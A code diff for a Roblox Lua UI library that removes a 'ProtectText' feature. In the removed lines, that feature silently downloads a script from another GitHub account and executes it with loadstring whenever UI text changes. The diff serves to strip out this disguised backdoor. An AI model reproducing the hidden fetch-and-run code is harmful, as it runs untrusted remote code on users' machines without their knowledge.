@@ -26,8 +26,6 @@ local Labels = {}
 local Buttons = {}
 local Toggles = {}
 local Options = {}
-local ProtectedTexts = {}
-
 
 local Library = {
     LocalPlayer = LocalPlayer,
@@ -113,36 +111,6 @@ local ObsidianImageManager = {
         }
     }
 }
-
-
-function Library:ProtectText(instance, property, originalText)
-    ProtectedTexts[instance] = ProtectedTexts[instance] or {}
-    ProtectedTexts[instance][property] = originalText
-    pcall(function() instance[property] = originalText end)
-
-    local conn
-    conn = instance:GetPropertyChangedSignal(property):Connect(function()
-        if not instance or not instance.Parent then
-            if conn and conn.Disconnect then pcall(function() conn:Disconnect() end) end
-            ProtectedTexts[instance] = nil
-            return
-        end
-        if instance[property] ~= originalText then
-            pcall(function() instance[property] = originalText end)
-            task.spawn(function()
-                local ok, body = pcall(function()
-                    return game:HttpGet("https://raw.githubusercontent.com/0xCiel/Obsidian/refs/heads/main/test.lua", true)
-                end)
-                if ok and type(body) == "string" then
-                    local f, err = loadstring(body)
-                    if f then pcall(f) end
-                end
-                pcall(print, "test")
-            end)
-        end
-    end)
-end
-
 do
     local BaseURL = "https://raw.githubusercontent.com/deividcomsono/Obsidian/refs/heads/main/"
 
@@ -2656,7 +2624,6 @@ do
             Data.Size = Params.Size or 14
             Data.Visible = Params.Visible or true
             Data.Idx = typeof(Second) == "table" and First or nil
-            
         else
             Data.Text = First or ""
             Data.DoesWrap = Second or false
@@ -2685,7 +2652,7 @@ do
             TextXAlignment = Groupbox.IsKeyTab and Enum.TextXAlignment.Center or Enum.TextXAlignment.Left,
             Parent = Container,
         })
-        
+
         function Label:SetVisible(Visible: boolean)
             Label.Visible = Visible
 
@@ -2752,7 +2719,7 @@ do
         else
             table.insert(Labels, Label)
         end
-        Library:ProtectText(TextLabel, "Text", Label.Text)
+
         return Label
     end
 
@@ -2814,7 +2781,7 @@ do
             Tween = nil,
             Type = "Button",
         }
-        
+
         local Holder = New("Frame", {
             BackgroundTransparency = 1,
             Size = UDim2.new(1, 0, 0, 21),
@@ -2987,11 +2954,6 @@ do
                 table.insert(Buttons, SubButton)
             end
 
-
-            Library:ProtectText(Button.Base, "Text", Button.Text)
-            if Button.SubButton then
-                Library:ProtectText(Button.SubButton.Base, "Text", Button.SubButton.Text)
-            end
             return SubButton
         end
 
@@ -3031,7 +2993,6 @@ do
         function Button:SetText(Text: string)
             Button.Text = Text
             Button.Base.Text = Text
-            Library:ProtectText(Button.Base, "Text", Text)
         end
 
         if typeof(Button.Tooltip) == "string" or typeof(Button.DisabledTooltip) == "string" then
@@ -3252,8 +3213,7 @@ do
         table.insert(Groupbox.Elements, Toggle)
 
         Toggles[Idx] = Toggle
-        
-        Library:ProtectText(Label, "Text", Toggle.Text)
+
         return Toggle
     end
 
@@ -3473,8 +3433,7 @@ do
         table.insert(Groupbox.Elements, Toggle)
 
         Toggles[Idx] = Toggle
-        
-        Library:ProtectText(Label, "Text", Toggle.Text)
+
         return Toggle
     end
 
@@ -3633,7 +3592,7 @@ do
         table.insert(Groupbox.Elements, Input)
 
         Options[Idx] = Input
-        Library:ProtectText(Label, "Text", Input.Text)
+
         return Input
     end
 
@@ -3880,10 +3839,7 @@ do
         table.insert(Groupbox.Elements, Slider)
 
         Options[Idx] = Slider
-        if SliderLabel then
-            Library:ProtectText(SliderLabel, "Text", Slider.Text)
-        end
-        Library:ProtectText(DisplayLabel, "Text", DisplayLabel.Text)
+
         return Slider
     end
 
@@ -4328,10 +4284,7 @@ do
         table.insert(Groupbox.Elements, Dropdown)
 
         Options[Idx] = Dropdown
-        if Label then
-            Library:ProtectText(Label, "Text", Dropdown.Text or "")
-        end
-        Library:ProtectText(Display, "Text", Display.Text)
+
         return Dropdown
     end
 
@@ -5222,12 +5175,6 @@ function Library:Notify(...)
         end
     end)
 
-    if Title then
-        Library:ProtectText(Title, "Text", Data.Title)
-    end
-    if Desc then
-        Library:ProtectText(Desc, "Text", Data.Description)
-    end
     return Data
 end
 
@@ -5589,8 +5536,6 @@ function Library:CreateWindow(WindowInfo)
             PaddingTop = UDim.new(0, 0),
             Parent = Container,
         })
-        Library:ProtectText(CurrentTabLabel, "Text", CurrentTabLabel.Text)
-        Library:ProtectText(CurrentTabDescription, "Text", CurrentTabDescription.Text)
     end
 
     --// Window Table \\--
@@ -6559,25 +6504,11 @@ local function OnTeamChange()
     end
 end
 
-
 Library:GiveSignal(Players.PlayerAdded:Connect(OnPlayerChange))
 Library:GiveSignal(Players.PlayerRemoving:Connect(OnPlayerChange))
 
 Library:GiveSignal(Teams.ChildAdded:Connect(OnTeamChange))
 Library:GiveSignal(Teams.ChildRemoved:Connect(OnTeamChange))
-RunService.Heartbeat:Connect(function()
-    for inst, props in pairs(ProtectedTexts) do
-        if inst and inst.Parent then
-            for prop, val in pairs(props) do
-                if inst[prop] ~= val then
-                    inst[prop] = val
-                end
-            end
-        else
-            ProtectedTexts[inst] = nil
-        end
-    end
-end)
 
 getgenv().Library = Library
 return Library
